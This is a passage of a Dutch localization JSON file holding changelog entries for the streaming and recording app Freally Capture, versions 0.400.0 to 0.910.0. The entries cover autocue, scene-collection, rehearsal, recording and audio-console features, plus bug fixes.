vergelijkbaar pad heeft (een UNC-pad zou de NTLM-hash lekken naar een vijandige scèneverzameling) — nu meteen geweigerd. De codereview vond er nog 11, allemaal opgelost: een panic in de renderlus bij canvassen smaller dan 240 px, een verouderde vlag voor repetitieopname die een opname kon stoppen die de gebruiker met de hand had gestart, de lijst Recente scènes die de scène liet zien die al in het programma stond (en ongedaan maken/opnieuw die die lijst, alleen bedoeld voor de sessie, terugdraaide), wijzigingen in de bannerkleur die een al vastgezette banner niet opnieuw tekenden, de klokkiezer die oude doeltijden buiten de 5-minutenstappen stilletjes afrondde, een mislukte afbeelding op het aftelscherm die elke seconde opnieuw werd geprobeerd (en gelogd), een transparante PNG op het aftelscherm die ondoorzichtig werd weergegeven, en diverse duplicatie die nu gedeeld is (één lijst met audio-extensies, één klokkiezer, één tekenaar voor afgeronde rechthoeken).","changelog.c5d49f26f5b2":"[0.910.0] — 2026-07-19 (Autocue vernieuwd)","changelog.f500d8210c1a":"<em>De autocue wordt volwassen.</em> Een gerichte vernieuwing van de autocue die in 0.800.0 verscheen: pauzes worden echte objecten die je niet per ongeluk kapot typt, het scrollen kan het tempo van een nummer volgen, een optionele aanloop telt de presentator af, de projector geeft het hoofdvenster terug aan de operator, en het script kan zichzelf voorlezen of je woorden aanvullen terwijl je typt. Alles wat nieuw is, is lokaal en staat standaard uit of neutraal — de woordenboeken voor automatisch aanvullen zijn gewone lokale databestanden (lui geladen, één taal tegelijk) en Voorlezen spreekt via de eigen spraakengine van het besturingssysteem; er wordt niets meegeleverd en niets opgehaald.","changelog.fd0ed8487a73":"<strong>Caesura-pauzechips</strong> — een pauze in de tekst, geschreven als <code> -- </code> (een tel) of <code> --N </code> (N seconden stilstaan), wordt in de scripteditor nu weergegeven als één ondeelbaar pilletje: de cursor kan er niet in belanden, één <strong>Delete/Backspace</strong> verwijdert het hele token (nooit een losse streep), en kopiëren/plakken neemt de markering intact mee. Een pauze leest en bewerkt als één object in plaats van vier losse tekens.","changelog.29694897048a":"<strong>Aftellen starten</strong> — een optionele aanloop van <strong>3-2-1</strong> voordat het scrollen begint, getoond op zowel het voorbeeld van de operator als de projector van de presentator, zodat de lezer even adem kan halen voordat de tekst beweegt.","changelog.645e73577cff":"<strong>BPM-modus</strong> — stel het scrolltempo in <strong>slagen per minuut (50–250)</strong> in plaats van tekens per seconde in, om songteksten in de maat van de muziek te lezen. Wissel vrij van modus; een wijziging past het tempo van het lopende scrollen <strong>live</strong> aan.","changelog.a1ef18efc830":"<strong>Echte transportpictogrammen</strong> — de projector en het operatorpaneel hebben nu echte <strong>SVG</strong>-knoppen voor afspelen / pauzeren / stoppen / terugspoelen / vooruitspoelen / opnieuw beginnen in plaats van de tijdelijke tekens.","changelog.ccfc933d79f9":"<strong>De projector maakt het hoofdvenster vrij</strong> — als je de projector voor de presentator opent, <strong>sluit nu het operatorvenster</strong>, zodat je je livestream vanuit het hoofdvenster kunt draaien terwijl de presentator leest. Met een startaftelling ingesteld <strong>spoelt de projector bij het openen automatisch terug naar het begin, telt af en speelt vanaf het begin</strong> — één handeling zet de lezer op nul en start.","changelog.90ca5a72ccb0":"<strong>Voorlezen</strong> — beluister een script via de <strong>eigen spraaksynthese</strong> van het besturingssysteem — Windows <strong>SAPI 5 / OneCore</strong>, macOS <strong>AVSpeechSynthesis</strong>, en op Linux de Web Speech API of een terugval op <strong><code>spd-say</code> / <code>espeak-ng</code></strong> waar die geïnstalleerd is. Er wordt geen TTS-engine meegeleverd; de stem van het besturingssysteem wordt gebruikt zoals hij is. Zie <code>THIRD-PARTY.md</code>.","changelog.5689e3adcf62":"<strong>Automatisch aanvullen met spooktekst</strong> — lichtgrijze suggesties voor woorden en zinsdelen verschijnen in de tekst terwijl je typt en worden met <strong>Tab</strong> geaccepteerd. Elk van de <strong>18 talen van de app</strong> heeft een eigen woordenboek, dat alleen wordt geladen voor de taal waarin je schrijft. De bronnen van de woordenboeken en hun <strong>CC-BY- / permissieve</strong> licenties (Tatoeba, SCOWL, Leipzig Corpora, OpenTaal, …) staan in <code>THIRD-PARTY.md</code>.","changelog.f1248a45cf83":"<strong>Regelafbreking gelijk in voorbeeld ↔ projector</strong> — regels breken nu op precies dezelfde plekken af in het voorbeeld van de operator en op de projector op volledig scherm, zodat de regel die jij klaarzet de regel is die de presentator leest. De projector geeft het script weer op een podium van vaste grootte dat met CSS naar de monitor wordt geschaald, dus een regelafbreking kan op het grote scherm niet meer op een andere plek vallen.","changelog.33a14cdb624d":"<strong>Verstreken tijd in de zoekbalk</strong> — de weergave van de verstreken tijd loopt niet meer <strong>voorbij</strong> de totale leestijd; hij stopt aan het eind in plaats van eeuwig door te tellen als het script helemaal gescrold is.","changelog.a757a5cd6973":"<strong>Geen nieuwe meegeleverde runtime-afhankelijkheid en geen nieuwe netwerkverbinding.</strong> De woordenboeken voor automatisch aanvullen zijn lokale JSON-gegevens (één bestand per taal, op aanvraag geladen voor de actieve taal), en Voorlezen stuurt de spraakengine aan die al op de machine aanwezig is — er wordt tijdens het draaien niets opgehaald. De vermeldingen voor gegevens en spraakengines staan in <code>THIRD-PARTY.md</code>. Elke nieuwe bediening en modus is vertaald in alle 18 talen.","changelog.6c151934cc4a":"[0.900.0] — 2026-07-18 (Studiobeheer &amp; workflow — fase 8)","changelog.db7b34e4b837":"<em>Je studio is van jou.</em> Fase 8 maakt een hele indeling draagbaar en deelbaar, voegt versiebeheer voor je scènes toe, zet je meestgebruikte acties op één tik afstand, en opent volledige thema's en een draagbare modus voor een USB-stick. Alles is strikt lokaal — geen nieuwe afhankelijkheden en geen nieuwe netwerkverbindingen.","changelog.197ef0e08085":"<strong>Pakket van een scèneverzameling — exporteren/importeren (CAP-N60)</strong> — bundel een hele indeling (de scènegraaf plus de lokale bestanden: afbeeldingen, media, LUT's, maskers, lettertypen) in één draagbaar <code>.fcappack</code> en deel die als één bestand. Bij het importeren worden de bestanden op de doelmachine opnieuw gekoppeld; URL- en UNC-paden worden als <em>extern</em> vastgelegd en nooit opgevraagd; lettertypen worden gemarkeerd voor naamsvermelding. Geen marktplaats, geen server.","changelog.1993c99e5fa2":"<strong>Scèneverzamelingen vergelijken &amp; samenvoegen (CAP-N61)</strong> — vergelijk de actieve verzameling met een andere verzameling, een <code>.fcappack</code> of een momentopname; zie toegevoegde / verwijderde / gewijzigde scènes en bronnen, en per item transformatie / filters / zichtbaarheid; en <strong>kies</strong> vervolgens precies welke wijzigingen je samenvoegt (een gekozen scène neemt de bronnen mee die ze gebruikt). Breng twee versies met elkaar in overeenstemming zonder cloud.","changelog.e1355c54d6d7":"<strong>Momentopnamen met een naam (CAP-N62)</strong> — controlepunten met een naam van de actieve verzameling in één klik, met een tijdlijn om door te bladeren, herstel en een vergelijkingsweergave (die de vergelijkingstool hergebruikt). Bewuste geschiedenis naast automatisch opslaan en ongedaan maken; maximaal 50, met vermeld schijfgebruik, en een controlepunt „vóór herstel”, zodat herstellen nooit eenrichtingsverkeer is.","changelog.afc196f3991b":"<strong>Draagbare modus (CAP-N63)</strong> — zet een markeerbestand <code>freally-portable.txt</code> naast het uitvoerbare bestand en alle appgegevens (instellingen, profielen, verzamelingen) staan dan in de map van de exe — draai de hele studio vanaf een USB-stick zonder het profiel van het besturingssysteem van de host aan te raken. Instellingen → Over toont de draagbare status en de locatie van de gegevens.","changelog.4072af7dcc85":"<strong>Back-up en herstel in één bestand (CAP-N64)</strong> — exporteer alles (instellingen, profielen, scèneverzamelingen) naar één <code>.fcapbackup</code> met versienummer, en herstel het selectief hier of op een nieuwe machine (een migratiestroom). Geheimen — streamsleutels, wachtwoorden — worden altijd uit een back-up verwijderd; velden die de server beheert (EULA, onboarding, cameraprofielen) blijven bij herstel behouden.","changelog.6b0e17039cce":"<strong>Thema-editor (CAP-N65)</strong> — een visuele editor bovenop het thema met CSS-variabelen: stel het volledige palet van zes kleuren samen met live waarschuwingen voor <strong>WCAG-contrast</strong>, en exporteer/importeer deelbare <code>.fctheme</code>-bestanden.","changelog.1f2d5f8ca405":"<strong>Voorinstellingen voor dockindelingen (CAP-N66)</strong> — sla weergave-indelingen met een naam op (zichtbaarheid van het statistiekendock + oriëntatie van de mixer) en wissel daartussen.","changelog.a66f42ada61a":"<strong>Instellingen zoeken &amp; recent gewijzigd (CAP-N67)</strong> — een zoekveld boven het venster Instellingen (elke categorie met trefwoorden geïndexeerd, met direct springen) plus per categorie een markering „gewijzigd sinds openen”.","changelog.5331e00f8cd2":"<strong>Raster met snelacties (CAP-N68)</strong> — een aanpasbaar knoppenbord in Stream Deck-stijl (scènes, opdrachten, macro's, soundboardpads) met een kleur per knop en pagina's; opdrachtknoppen voeren dezelfde toegestane studioacties uit als sneltoetsen en het LAN-paneel, en de rasterconfiguratie wordt <strong>gedeeld met het LAN-paneel van CAP-N06</strong>.","changelog.5217d787621c":"<strong>Autocueprojector</strong> — „Projector openen” opende een leeg venster dat niet kon worden gesloten (het had geen rand en geen titelbalk, en zijn IPC was niet geautoriseerd). Het opent nu als normaal venster dat je kunt sluiten en dat het scrollende script toont; <strong>Esc</strong> sluit het. <strong>Bestand → Afsluiten</strong> sluit de app nu ook betrouwbaar af (het hoofdvenster miste de toestemming om vensters te sluiten).","changelog.a9bceee9f47d":"<strong>Autocuedialoogvenster</strong> — een knop <strong>Stoppen</strong> (pauzeren + terugspoelen naar het begin), zodat een kort script er na Afspelen niet meer leeg uitziet en de tekst opnieuw kan worden gelezen en bewerkt.","changelog.2e825abc071d":"<strong>Bronnenpaneel</strong> — de knoppen om een bron te verwijderen of te verplaatsen verschenen alleen bij aanwijzen en konden buiten de rail vallen; elke bron heeft nu een altijd zichtbare <strong>bedieningsbalk bovenaan</strong> (LIVE/REC · vergrendelen · volgorde · filters · eigenschappen · klonen · verwijderen).","changelog.78b6f1cfd693":"<strong>Geen nieuwe afhankelijkheden</strong> (de <code>zip</code>-crate was al gevendord) en <strong>geen nieuwe netwerkverbindingen</strong>: de functies voor pakketten / back-ups / momentopnamen / thema's zijn strikt lokale bestanden; het delen van snelacties via het LAN loopt over het bestaande opt-in-webpaneel van CAP-N06. <code>wix.version</code> verhoogd van 0.253.0 → 0.254.0 (MSI-limiet voor de minor-versie).","changelog.871a49bf7084":"[0.800.0] — 2026-07-17 (Gasten op afstand &amp; showproductie — fase 7)","changelog.72750cf3fb55":"<em>Van „gasten maken verbinding” naar „een geproduceerde show”.</em> Fase 7 maakt van de sessie met gasten op afstand een studio voor meerdere gasten en voegt er de laag voor liveproductie bovenop: tekenen op het live programma, een autocue draaien, gasten in een wachtruimte houden voordat ze de uitzending in gaan, ze privécues sturen, de verbindingskwaliteit van elke gast volgen en iedereen automatisch in een raster zetten. Het transport voor gasten op afstand laat nu <strong>tot acht gasten</strong> toe (gastheer + 8 = een galerij van 1–9). Alles loopt over de bestaande opt-in P2P-sessie — geen nieuwe brokers, geen server die Mike draait, niets dat automatisch verbinding maakt — en elk nieuw onderdeel staat standaard uit of is niet gekoppeld.","changelog.c6ee3e56912f":"<strong>Telestrator — tekenen op het live programma (CAP-N57)</strong> — maak aantekeningen op het uitgaande beeld met pen, markeerstift, pijl en ellips, gecomponeerd in het programma, zodat de markeringen in de opname en de stream terechtkomen op het moment dat je ze tekent (niet alleen in je voorbeeld). Markeringen vervagen na een ingestelde tijd, of schakel naar de whiteboardmodus om ze te bewaren tot je ze wist. Houdt rekening met de druk van een tekentablet; een sneltoets om te wissen (niet gekoppeld totdat je er een toewijst). Direct over het afgewerkte programma getekend, dus het bereikt elke uitvoer — ook de varianten van CAP-N53 voor alleen stream of alleen opname.","changelog.2b2452ceb3fd":"<strong>Autocue (CAP-N58)</strong> — een vloeiend scrollend script op drie plekken tegelijk: een paneel in de app, een projector op volledig scherm voor de presentator (met spiegelmodus voor glas met beamsplitter) en een weergave op het aanraakpaneel op het LAN. Scripts in platte tekst of lichte Markdown, instelbare snelheid en lettertype. Het scrollen is te bedienen met een sneltoets, MIDI, OSC of het LAN-paneel — de scrollpositie wordt gedeeld, dus elke weergave blijft in de pas.","changelog.eba68ba03d3d":"<strong>Wachtruimte voor gasten op afstand (CAP-N54)</strong> — nieuwe gasten kunnen in een privé wachtstand terechtkomen: je ziet hun camera en een technische check van camera en microfoon in een monitor, buiten het programma, en zet ze met één klik in de uitzending. Optioneel (standaard uit); de gast ziet een banner „je zit in de wachtruimte” in zowel de desktop-app als de webpagina om mee te doen.","changelog.7576d4597bb5":"<strong>Cue- en praatsysteem (CAP-N55)</strong> — stuur een verbonden gast privé tekstcues („30 seconden”, „rond af”, „jij bent zo aan de beurt”, „spreek luider”) via het bestaande P2P-datakanaal. De gast ziet de cue met een live aftelling op zijn deelnamepagina of in de app — nooit in het programma. Geen nieuw netwerkoppervlak.","changelog.8eed1deed31f":"<strong>Dashboard voor de verbindingskwaliteit van gasten (CAP-N56)</strong> — een live QoS-overzicht per gast: round-trip-tijd, pakketverlies, ontvangen resolutie en framerate, en jitter, met een groen/oranje/rood badge en een sparkline met de geschiedenis, zodat „je verbinding wordt slechter” zichtbaar is voordat kijkers het merken.","changelog.a49bc0c0f6ee":"<strong>Automatische rasters voor gasten (CAP-N59)</strong> — zet de gasten in de uitzending in een automatisch raster van 1–9 dat zich aanpast als gasten meedoen, vertrekken of in de uitzending worden gezet, waarbij de naam van elke plek als variabele <code>{{guestN}}</code> wordt gepubliceerd, zodat een titelbron een naamplaatje wordt dat zichzelf bijwerkt. Door de opbouw overlappen ze nooit.","changelog.5b7dd4b9a43f":"<strong>Sessies op afstand met meerdere gasten</strong> — het opt-in-transport voor gasten op afstand laat nu <strong>tot acht gasten</strong> tegelijk toe (voorheen één), elk met een eigen tegel, eigen dempknoppen, verbindingskwaliteit, cuekanaal en plaatsing in één klik. Nog steeds dezelfde peer-to-peer-sessie — media gaan rechtstreeks tussen gastheer en gasten, zonder server, en er wordt niets verbonden totdat je iemand uitnodigt. Gevalideerd tot het prestatiebudget voor vier gasten; meer gasten hangen af van de bandbreedte en CPU van de gastheer.","changelog.c35af444edf6":"[0.700.0] — 2026-07-17 (Betrouwbaar streamen &amp; inzicht — fase 6)","changelog.82098fd2d64d":"<em>Repeteren, meten, verklaren.</em> Fase 6 draait erom dat je weet dat je show standhoudt voordat je live gaat, en dat je achteraf begrijpt wat er gebeurde. Je kunt nu de hele pipeline draaien tegen een privé lokale bestemming met een gesimuleerd slecht netwerk, benchmarken wat je machine echt aankan, een opgenomen tijdlijn bekijken van elke render-, encode- en herverbindingsgebeurtenis, en een geschreven rapport krijgen als de stream eindigt — plus elke bron markeren als alleen-stream of alleen-opname. Alles staat standaard uit of neutraal, en niets hiervan voegt een netwerkverbinding toe: de proefrun en de benchmark zijn volledig lokaal, en de netwerksimulator verslechtert alleen ooit de eigen loopback-bestemmingen van de repetitie — nooit een echte uitzending.","changelog.be9efbd98807":"<strong>Netwerksimulator (CAP-N48)</strong> — een netwerkshaper die alleen voor repetities is: deterministische bandbreedtelimieten met een token-bucket, extra latentie/jitter en ingeplande uitvallen, toegepast op de bestemmingen van de proefrun, zodat je herverbindingsgedrag, het isoleren van multistreambanen en bitratekeuzes kunt oefenen tegen een dunne, haperende uplink vóór de dag van de show. Voorinstellingen voor „hotel-wifi” en een mobiele hotspot, plus een volledig eigen profiel. Deterministisch (elke keer dezelfde oefening) en door de opbouw niet in staat om een echte Ga live aan te raken.","changelog.37e19bbed36e":"<strong>Proefrunmodus / „Ga live (repetitie)” (CAP-N49)</strong> — draai de hele livepipeline — compositor, encoder, mux en de echte herverbindingslogica — tegen een eigen loopback-bestemming met het echte statistiekendock, de LIVE-weergave en de alarmen, zodat de hele show repeteert terwijl er <strong>nul bytes de machine verlaten</strong>. Een aparte paarse knop Repeteren, een badge REPETITIE op elk live-oppervlak en een statusbanner maken het onmogelijk om een repetitie met een echte uitzending te verwarren; streamsleutels worden niet eens gelezen, dus een proefrun vóór de show werkt al voordat de sleutels bestaan.","changelog.85d495ae89bc":"<strong>Forensische tijdlijn van verloren frames (CAP-N50)</strong> — een opgenomen tijdlijn over de hele sessie die rendertijd, wachtrijdiepte van de encoder, bitrate en verloren frames per bestemming, herverbindingen, scènewissels, markeringen en alarmen op één zoombare grafiek met elkaar in verband brengt — het antwoord achteraf op „wat gebeurde er in minuut 43?”. Het statistiekendock toont <em>nu</em>; dit legt de hele sessie vast en verklaart haar, bemonsterd buiten de renderlus, zodat het compositiepad van 60 fps er geen werk bij krijgt.","changelog.bb50bfcb281c":"<strong>Rapport van de streamsessie (CAP-N51)</strong> — aan het eind van een sessie een optioneel lokaal rapport in HTML + Markdown, naast de opname geschreven: uptime, gemiddelde en piekbitrate per bestemming, percentage uitvaltijd, het herverbindingslog, markeringen, alarmen en opnamepaden. Alleen lokaal, alleen door jou te delen; standaard uit.","changelog.fbfd2e9fc49b":"<strong>Wizard voor de encoder-benchmark (CAP-N52)</strong> — een begeleide, volledig offline benchmark die korte encodeerladders echt <em>uitvoert</em> (elke gevonden encoder × voorinstelling × resolutie × fps) op je machine, de gehaalde fps en de marge meet, en op basis van de metingen instellingen voor canvas, encoder en bitrate aanbeveelt — met toepassen in één klik. Mislukkingen worden vermeld, nooit verborgen, dus een encoder die je machine aanbiedt maar niet kan bijbenen, wordt gedocumenteerd in plaats van stilletjes weggelaten. Anders dan de wizard bij de eerste start, die alleen mogelijkheden aftast en vuistregels toepast: deze meet. Geweigerd tijdens live gaan of opnemen, zodat hij nooit midden in de show de encoder afpakt.","changelog.7893b3df0384":"<strong>Zichtbaarheid van bronnen per uitvoer (CAP-N53)</strong> — markeer elk scène-item als zichtbaar in de stream maar niet in de opname, of andersom, binnen één canvas — houd meldingen en chat in het livebeeld terwijl de VOD-opname schoon blijft. Op elke bronregel verschijnen bij aanwijzen de schakelaars <strong>LIVE</strong> / <strong>REC</strong>; het hoofdoogje bepaalt nog steeds alles, en het voorbeeld van de operator, de projectoren en de multiview tonen altijd het volledige programma.","changelog.fd1925b97ec5":"<strong>Herhalende tekst- en reclame-effecten (Text FX)</strong> — drie nieuwe itemfilters voor onbemande promo- en reclamelussen: een filter <strong>Perspectief</strong> dat elke bron (tekst, camera's, opnames) als plat vlak van de kijker weg kantelt, met een optionele vervaging aan de verre rand — zet het na het bestaande eindeloze filter <strong>Scrollen</strong> voor een volledige „Star Wars”-openingstekst — en een filter <strong>Fade-lus</strong> dat een item laat infaden, vasthoudt, laat uitfaden en verborgen houdt in een herhalende cyclus. Alles is tijdgestuurd, dus een advertentie loopt vanzelf.","changelog.f557861d47ae":"[0.600.0] — 2026-07-16 (Opnemen &amp; replay in de diepte — fase 5)","changelog.baab6b442a79":"<em>Alles rond het bestand.</em> Fase 5 bouwt uit wat er met een opname gebeurt vóór, tijdens en nadat die op schijf belandt: losse bestanden per bron, een clip-trimmer, echte transparantie, splitsen en hoofdstukmarkeringen op basis van gebeurtenissen, een reeks taken na de opname, een integriteitscontrole en SMPTE-LTC-tijdcode. Elke nieuwe mogelijkheid staat standaard uit of neutraal — een opname waaraan je niets verandert, is bit voor bit gelijk aan voorheen — en niets hiervan voegt een netwerkverbinding toe.","changelog.56eaf8f0fe4b":"<strong>ISO-opname per bron (CAP-N40)</strong> — neem gekozen bronnen schoon op in eigen bestanden naast het programma, vóór de compositie (met of zonder de filters van de bron), op canvasformaat en framerate, zodat elke ISO uitgelijnd met het programma op een montagetijdlijn valt. Elke gast op afstand is gewoon een bron, dus ISO's per gast krijg je er gratis bij. Eigen container en encoder per baan; audio wordt na de filters maar vóór fader en dempen afgetapt (een mixbeslissing maakt een ISO-bestand nooit stil); de paniekknop houdt ook de ISO-banen vast. Uit totdat er bronnen zijn gekozen; vooraf eerlijke uitleg over wat elke baan kost.","changelog.070729b0bdcf":"<strong>Replay- &amp; clip-trimmer (CAP-N41)</strong> — een licht trimvenster voor elke opgeslagen opname in een standaardformaat: in- en uitpunten per frame met live voorbeeld, en een eerlijke exportbadge die vooraf zegt of de clip via <strong>stream-copy</strong> gaat (een in-punt op een keyframe — bijna direct, verliesvrij) of opnieuw wordt gecodeerd. Eén klik maakt er via de geometrie van het verticale canvas een verticale 9:16-master van.","changelog.a785df0dd1f8":"<strong>Opnemen met alfakanaal (CAP-N42)</strong> — neem het programma met echte transparantie op in het eigen <code>.frec</code> (een nieuwe headervlag; de formaatversie is ongewijzigd, dus alfabestanden blijven overal afspeelbaar en oude bestanden worden ondoorzichtig ingelezen). De recorder krijgt een eigen render met transparante achtergrond, zodat voorbeeld en stream het normale ondoorzichtige programma houden. Exporteer via het gelabelde ffmpeg-onderdeel naar een <code>.mov</code>-master in <strong>ProRes 4444</strong> of <strong>QuickTime Animation (QTRLE)</strong> voor NLE's.","changelog.79e72558f2ad":"<strong>Splitsen bij scènewissel / markering (CAP-N43)</strong> — nieuwe triggers voor de splitter van het eigen <code>.frec</code>: begin een nieuw deelbestand bij een scènewissel, bij het plaatsen van een hoofdstukmarkering of bij een stap in het draaiboek van de show. Elk deel begint precies op de framegrens van de gebeurtenis (minimale deellengte van één seconde, zodat een storm aan gebeurtenissen geen confettibestanden kan opleveren). Standaardcontainers splitsen alleen op tijd, en dat staat duidelijk in de instellingen.","changelog.ef021f62a151":"<strong>Automatische markeringen bij gebeurtenissen (CAP-N44)</strong> — hoofdstukmarkeringen die automatisch worden geplaatst bij studiogebeurtenissen — scènewissels, opgeslagen replays, herverbindingen van de stream, reeksen verloren frames, afgaande alarmen en acties van de regelengine — elk met een getypeerd label, naast de bestaande sneltoets voor handmatige markeringen. De labels gaan mee in de hoofdstuktitels van mkv en in het bijbestand <code>.chapters.txt</code>.","changelog.5e520f7a947e":"<strong>Pipeline na opname (CAP-N45)</strong> — een takenreeks na de opname per profiel, uit een <strong>gesloten, gesandboxte</strong> set acties: verifiëren → hermuxen naar MP4 → luidheid normaliseren → een naamregel toepassen → verplaatsen/kopiëren naar een map → tonen in bestandsbeheer → Lua-scripts melden. Draait op de achtergrond met een live wachtrijweergave; de reeks stopt bij de eerste mislukking. Er is bewust geen stap „een opdracht uitvoeren”.","changelog.792a44452b11":"<strong>Integriteitscontrole voor opnames (CAP-N46)</strong> — een snelle lokale controle (na het afronden of op verzoek) van de containerstructuur, de afsluitende trailer, de continuïteit van videoframes, de continuïteit van audiosamples per spoor, de afwijking in de A/V-interleaving en de duur ten opzichte van de klok van de recorder, met een rapport in gewone taal: OK / waarschuwing / mislukt. Het eigen <code>.frec</code> krijgt de grondige behandeling; standaardbestanden krijgen een eerlijke ffmpeg-scan op structuur en decodeerfouten.","changelog.42ea336f6972":"<strong>LTC-tijdcodebron &amp; -lezer (CAP-N47)</strong> — een eigen generator en lezer voor lineaire SMPTE 12M-tijdcode (klassieke audiotijdcode, volledig offline). Genereer LTC op een toewijsbaar mixerspoor (neem het op of stuur het naar externe apparatuur); lees binnenkomende LTC van elke audio-ingang om een ingebrande tijdcoderegel op de systeemstatistieken-overlay en hoofdstukmarkeringen met LTC-stempel aan te sturen. Heen en terug nauwkeurig tot ±1 frame bij 24/25/30 fps.","changelog.157723e79681":"<strong>Het insluiten van hoofdstukken gaat niet meer achteruit als er een verticale opname loopt.</strong> De controle voor het insluiten van mkv-hoofdstukken kijkt nu alleen naar het bestand van de hoofdopname, dus een parallel verticaal (of ISO-)bestand duwt een mkv-opname van één bestand niet meer naar het pad met een bijbestand.","changelog.8d45b8a98d91":"[0.500.0] — 2026-07-15 (Audioproductie in de diepte — fase 4)","changelog.b7c13c220405":"<em>Van mixer naar console.</em> Fase 4 maakt van de bestaande mixer een uitzendconsole: fysieke uitgangsrouting en aux-/cue-mixen, een N×M-duckingmatrix, een automixer met gain-sharing, EBU R128-luidheidsnormalisatie (live rider + bewerking na de opname), een parametrische EQ met een live spectrum, een de-esser en een rommelfilter, een soundboard, opnemen met alleen audio (podcast), mix-minus per gast met voorinstellingen voor stemketens in één klik, en het vinden van plug-ins plus een MIT-schone basis voor het hosten van CLAP- <strong>en VST3</strong>-plug-ins. Alles is eigen klassieke DSP — geen ML, volgens het handvest — en staat standaard uit of neutraal, dus een mix waaraan je niets verandert, is bit voor bit gelijk aan voorheen.","changelog.5159ad1b9251":"<strong>Aux-bussen &amp; fysieke uitgangsrouting (CAP-N30)</strong> — stuur de mastermix of een van de zes spoorbussen naar extra fysieke uitvoerapparaten, elk met een trim, vanuit een matrix <strong>Routering</strong> (de knop Routering van de audiomixer). Een spoorbus die naar een koptelefoon gaat, is een cue-mix die van de monitor verschilt. Standaard precies het huidige gedrag (alleen de monitorbus bereikt een apparaat).","changelog.d41c3c08bea2":"<strong>Sidechain-duckingmatrix (CAP-N31)</strong> — één overzichtelijk raster <strong>Ducking</strong> van wie wie duckt: elke bron kan elke set ducken, elk paar met een eigen diepte, drempel, attack en release. De engine stapelt meerdere duckers per kanaal, zodat één kanaal tegelijk door meerdere triggers kan worden geduckt.","changelog.b732fddcfca9":"<strong>Automixer met gain-sharing (CAP-N32)</strong> — een schakelaar <strong>Automix</strong> in Dugan-stijl per kanaal: over alle automatisch gemixte microfoons wordt de totale versterking ~constant gehouden en toegekend aan wie er spreekt (een deterministische wet waarbij de versterkingen samen één zijn), ideaal voor panels met meerdere presentatoren en podcasts. Standaard uit.","changelog.ca003a06d04f":"<strong>EBU R128-luidheidsnormalisatie (CAP-N34)</strong> — een live <strong>luidheidsrider</strong> stuurt het programma naar een doel (−14 / −16 / −23 LUFS) met een piekplafond, toegepast op de master en elke spoorbus, zodat opnames en streams op een consistent niveau uitkomen; plus een actie <strong>Normaliseren</strong> na de opname in de lijst met opnames (ffmpeg <code>loudnorm</code>). Standaard uit.","changelog.01407091e030":"<strong>Parametrische EQ + spectrumweergave (CAP-N35)</strong> — een parametrische EQ met N banden (bell / low-shelf / high-shelf / notch / high-pass / low-pass) met <strong>versleepbare punten boven een live spectrumanalyzer</strong>; de curve is dezelfde RBJ-wiskunde die de engine uitvoert. Eigen FFT; de analyzer wordt per kanaal alleen ingeschakeld zolang de editor open is.","changelog.42a294780d05":"<strong>De-esser + rommelfilter (CAP-N36)</strong> — een <strong>de-esser</strong> met gesplitste banden (een sisklankdetector stuurt een dynamische high-shelf-verzwakking aan, fasecorrect, geen ML) en een schoon laag-afsnijdend filter van de tweede orde als <strong>rommelfilter</strong> voor stoten tegen het bureau en plofklanken — beide als gewone audiofilters.","changelog.29e99512428d":"<strong>Soundboard (CAP-N37)</strong> — een raster van pads met lokale audioclips, met versterking per pad, chokegroepen (een nieuwe pad stopt de vorige in zijn groep), herhalen, sneltoets, spoortoewijzing en optioneel automatisch ducken van de rest van de mix zolang een pad speelt. Pads worden via het gelabelde ffmpeg-onderdeel gedecodeerd en komen net als elke bron in de mixer.","changelog.251ef95cea94":"<strong>Opnemen met alleen audio (CAP-N38)</strong> — een <strong>podcastmodus</strong> die per spoor <strong>WAV</strong> opneemt via de eigen writer (er wordt helemaal geen video-encoder opgestart), optioneel getranscodeerd naar <strong>FLAC/Opus</strong> via het gelabelde ffmpeg-onderdeel, met markeringen voor overgeslagen stiltes in een bijbestand en bestandsnaamsjablonen van CAP-M25. Vanuit het dialoogvenster met opnames.","changelog.d0ae0d751fe2":"<strong>Mix-minus per gast &amp; voorinstellingen voor stemketens (CAP-N39)</strong> — <strong>voorinstellingen voor stemketens</strong> in één klik (omroep / podcast / schone ketens gate→comp→EQ→limiter), toe te passen op elk kanaal, en een eigen <strong>mix-minus (N−1)</strong>-retour per bron (iedereen in het programma behalve die bron), zodat een gast op afstand geen echo hoort.","changelog.d1c450a7bdfb":"<strong>Audioplug-ins — CLAP en VST3 vinden (CAP-N33)</strong> — een paneel <strong>Plug-ins</strong> dat je geïnstalleerde <strong>CLAP- en VST3</strong>-plug-ins in de standaardmappen vindt (opt-in, alleen lokale mappen, niets opgehaald). Beide formaten hebben een MIT-licentie en zijn $0-schoon; live hosten draait elke plug-in in een eigen proces dat crashes isoleert, met een eigen GUI — die integratie met het hostproces is in uitvoering, en het paneel zegt het plan eerlijk in plaats van een schakelaar te veinzen.","changelog.1002a64a6813":"<strong>Live filtervisualisaties (paradepaardje van de plug-ins)</strong> — elk audiofilter is nu een visueel instrument zolang de editor open is: een <strong>overdrachtscurve</strong> voor de dynamiek (compressor / limiter / gate) met het live signaal dat over de curve beweegt, een <strong>frequentieresponscurve</strong> voor de klankfilters (EQ / de-esser / rommelfilter), of een niveauweergave voor de rest — elk naast <strong>meters voor in / uit / gainreductie</strong> die met de audio meebewegen, in dezelfde strakke donkere analyzerstijl als de parametrische EQ.","changelog.5fbac10a716a":"<strong>Snelkoppeling op het bureaublad bij installatie op Windows</strong> — de MSI maakt nu een snelkoppeling <strong>Freally Capture</strong> op het bureaublad aan (die bij het verwijderen weer verdwijnt).","changelog.2a6141e43be0":"Gewijzigd","changelog.015b6bb3a57b":"<strong>VST3 heeft nu een MIT-licentie.</strong> Steinberg heeft de VST 3.8 SDK op <strong>2025-10-29</strong> opnieuw onder MIT gelicentieerd, dus de eerdere opmerking „VST3 is GPLv3 of propriëtair, niet compatibel” is gecorrigeerd in <code>vst.rs</code>, <code>claphost.rs</code> en <code>THIRD-PARTY-NOTICES.md</code> — VST3 is nu een $0-schone weg voor plug-ins, op gelijke voet met CLAP.","changelog.eaa014cf0965":"[0.400.0] — 2026-07-15 (Compositor &amp; FX in de diepte — fase 3 voltooid)","changelog.c2a0fb6beabd":"De tweede helft van fase 3 levert de vijf uitgestelde functies voor beweging en effecten en voltooit daarmee de fase: een <strong>bewegingsovergang (morph)</strong>, <strong>overgangsregels</strong>, een <strong>shaderstudio</strong> voor eigen WGSL-effecten, een editor voor het <strong>Bézier-masker</strong> en <strong>track-matte-stingers</strong> met optionele ducking van het programmageluid. Plus een reparatie aan twee links in het menu Help die niets deden.","changelog.9b85d048fa23":"<strong>Bewegingsovergang (morph) 